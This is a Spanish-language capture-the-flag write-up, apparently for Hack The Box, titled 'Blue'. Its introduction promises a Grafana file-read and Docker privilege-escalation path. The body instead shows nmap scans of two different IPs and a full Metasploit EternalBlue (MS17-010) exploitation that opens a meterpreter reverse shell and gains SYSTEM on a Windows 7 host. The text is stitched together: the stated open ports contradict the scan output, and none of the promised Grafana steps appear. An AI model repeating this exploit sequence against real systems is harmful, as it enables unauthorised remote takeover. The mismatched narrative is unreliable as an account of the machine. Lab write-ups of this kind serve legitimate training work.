---
title: Blue Machine  
author: epx1lon
date: 2026-01-05 00:34:00 +0800
categories: [WriteUps, HackTHeBox]
tags: [docker,grafana,hashcat]
---

En este post vamos a resolver una máquina que expone un servicio de monitorización muy popular: Grafana. Veremos cómo una falta de validación en las rutas de los plugins nos permite leer la base de datos interna, crackear contraseñas administrativas y, finalmente, escalar privilegios aprovechando permisos mal configurados en Docker.

![ADLab](/assets/img/blue.png)


## Reconocimiento y Enumeración

El primer paso fue identificar qué puertas tiene abiertas la máquina víctima (10.129.20.75).

```bash
root@kali:/home/alvaro/htb/data $ nmap -p- --min-rate 5000 -sS 10.129.20.75 -n -Pn -vvv              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 19:02 -05
Initiating SYN Stealth Scan at 19:02
Scanning 10.129.20.75 [65535 ports]
Discovered open port 135/tcp on 10.129.20.75
Discovered open port 445/tcp on 10.129.20.75
Discovered open port 139/tcp on 10.129.20.75
Discovered open port 445/tcp on 10.129.20.75
Discovered open port 49157/tcp on 10.129.20.75
Discovered open port 49154/tcp on 10.129.20.75
Discovered open port 49156/tcp on 10.129.20.75
Discovered open port 49153/tcp on 10.129.20.75
Discovered open port 49153/tcp on 10.129.20.75
Increasing send delay for 10.129.20.75 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49152/tcp on 10.129.20.75
Discovered open port 49155/tcp on 10.129.20.75
Discovered open port 49155/tcp on 10.129.20.75
Completed SYN Stealth Scan at 19:02, 14.51s elapsed (65535 total ports)
Nmap scan report for 10.129.20.75
Host is up, received user-set (0.15s latency).
Scanned at 2025-11-04 19:02:12 -05 for 15s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
           Raw packets sent: 70628 (3.108MB) | Rcvd: 68303 (2.732MB)
```

El escaneo rápido nos revela dos puertos principales:

- 22/tcp (SSH): Para administración remota.
- 3000/tcp (HTTP): Un servicio web en un puerto no estándar.

Profundizamos con un escaneo de versiones y scripts básicos (-sVC) para entender qué corre en el puerto 3000.

```bash
root@kali:/home/alvaro/htb/data $ nmap -p22,3000 -sVC 10.129.234.47 -Pn                                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:56 -05
Nmap scan report for 10.129.234.47
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```

Una vez sabiendo los puertos, lanzaste un escaneo para saber qué corre exactamente en ellos.

```bash
root@kali:/home/alvaro/htb/data $ nmap -p135,139,445 10.129.20.75 -sCV -Pn 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 19:15 -05
Nmap scan report for 10.129.20.75
Host is up (0.14s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-05T00:15:57
|_  start_date: 2025-11-04T23:59:31
|_clock-skew: mean: 7s, deviation: 2s, median: 6s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-05T00:15:56+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
```
El sistema operativo detectado es Windows 7 Professional 7601 Service Pack 1. Windows 7 es famoso por ser vulnerable a EternalBlue si no ha sido actualizado.

La vulnerabilidad *`EternalBlue (MS17-010)`* consiste en un **fallo crítico en el protocolo SMBv1 (Server Message Block versión 1)** de Windows que permite la **ejecución remota de código (RCE)** sin autenticación, es decir, un atacante puede tomar el control total de un sistema vulnerable **sin necesidad de credenciales**.


## Explotación con Metasploit

```bash
msf > search ms17-010

   #   Name                                           Disclosure Date  Rank     Check  Description                                                                          
   -   ----                                           ---------------  ----     -----  -----------                                                                          
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

```bash
msf exploit(windows/smb/ms17_010_psexec) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
                                             ndard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standar
                                             d 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                              machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.18.14    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.20.75
rhosts => 10.129.20.75
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.96
lhost => 10.10.14.96
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.96:4444 
[*] 10.129.20.75:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.20.75:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.20.75:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.20.75:445 - The target is vulnerable.
[*] 10.129.20.75:445 - Connecting to target for exploitation.
[+] 10.129.20.75:445 - Connection established for exploitation.
[+] 10.129.20.75:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.20.75:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.20.75:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.20.75:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.20.75:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.20.75:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.20.75:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.20.75:445 - Sending all but last fragment of exploit packet
[*] 10.129.20.75:445 - Starting non-paged pool grooming
[+] 10.129.20.75:445 - Sending SMBv2 buffers
[+] 10.129.20.75:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.20.75:445 - Sending final SMBv2 buffers.
[*] 10.129.20.75:445 - Sending last fragment of exploit packet!
[*] 10.129.20.75:445 - Receiving response from exploit packet
[+] 10.129.20.75:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.20.75:445 - Sending egg to corrupted connection.
[*] 10.129.20.75:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 10.129.20.75
[*] Meterpreter session 1 opened (10.10.14.96:4444 -> 10.129.20.75:49158) at 2025-11-04 21:54:58 -0500
[+] 10.129.20.75:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.20.75:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.20.75:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > shell
Process 1844 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

